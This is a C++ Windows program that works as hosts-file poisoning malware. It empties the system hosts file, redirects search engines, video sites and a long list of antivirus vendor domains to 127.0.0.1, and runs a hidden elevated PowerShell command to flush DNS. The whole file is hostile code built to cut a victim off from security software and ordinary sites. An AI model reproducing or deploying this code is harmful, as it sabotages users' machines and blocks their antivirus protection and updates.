#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "..\HelperDLL\HelperDLL\helper.h"

#define LINE_MAX 1024
#define MAX_LENGTH 4096

const char *poison_ip = "127.0.0.1";
const char *hostFile = "C:\\Windows\\System32\\drivers\\etc\\hosts";
const char *urls_to_poison[] =
    {
        "www.google.com",
        "www.youtube.com",
        "www.python.org",
        "www.netflix.com",
        "www.mcafee.com",
        "www.avast.com",
        "www.norton.com",
        "www.bitdefender.com",
        "www.totalav.com",
        "www.avira.com",
        "www.kaspersky.com",
        "www.bing.com",
        "www.duckduckgo.com",
        "\0"
        };

struct split_t
{
    char *strings[MAX_LENGTH];
    size_t max_count = MAX_LENGTH;
    size_t count;
};

inline void split(split_t *, char *, char *);
void EmptyFile(const char* filename);

int main(int argc, char *argv[])
{
    char line[LINE_MAX];
    split_t lines;
    EmptyFile(hostFile);
    char command[] = "ipconfig  /flushdns";
    FILE *fp;
    errno_t err = fopen_s(&fp,hostFile,"a");

    if(err)
    {
        MessageBeep(0);
        MessageBoxA(GetDesktopWindow(),"Run as administrator","Error",MB_OK);
        ExitProcess(-1);
    }
    
    SHELLEXECUTEINFOA ShlExecInfo = {0};
    ShlExecInfo.cbSize = sizeof(SHELLEXECUTEINFOA);
    ShlExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    ShlExecInfo.hwnd = GetDesktopWindow();
    ShlExecInfo.lpVerb = "runas";
    ShlExecInfo.lpFile = "powershell.exe";
    ShlExecInfo.lpParameters = command;
    ShlExecInfo.lpDirectory = NULL;
    ShlExecInfo.nShow = SW_HIDE;
    ShlExecInfo.hInstApp = NULL;

    for (int i = 0; urls_to_poison[i] != "\0"; i++)
    {
        memset(line,0,LINE_MAX);
        printf("%s",line);
        snprintf(line, LINE_MAX, "\n%s  %s", poison_ip, urls_to_poison[i]);
        fwrite(line,1,LINE_MAX,fp);
    }

    bool issuccessful = ShellExecuteExA(&ShlExecInfo);
    WaitForSingleObject(ShlExecInfo.hProcess, INFINITE);
    CloseHandle(ShlExecInfo.hProcess);
}

inline void split(split_t *sp, char *str, char *delim)
{
    static char *token;
    size_t count = 0;
    token = strtok(str, delim);
    while (token != NULL)
    {
        if (count < sp->max_count)
        {
            sp->strings[count++] = token;
        }
        token = strtok(NULL, delim);
    }
    sp->count = count;
}


void EmptyFile(const char* filename)
{
    FILE *fp;
    errno_t err = fopen_s(&fp,filename,"w");
    fwrite("",1,0,fp);
    fclose(fp);
}

// inline void writelines(char*filename,split_t *sp)
// {
//     FILE* fp;
//     errno_t err = fopen_s(&fp,filename,"a");
//     for(int j= 0; j < sp->count; j++ )
//     {
//         fwrite(sp->strings[j],1,strlen(sp->strings[j]),fp);
//     }
//     fclose(fp);
// }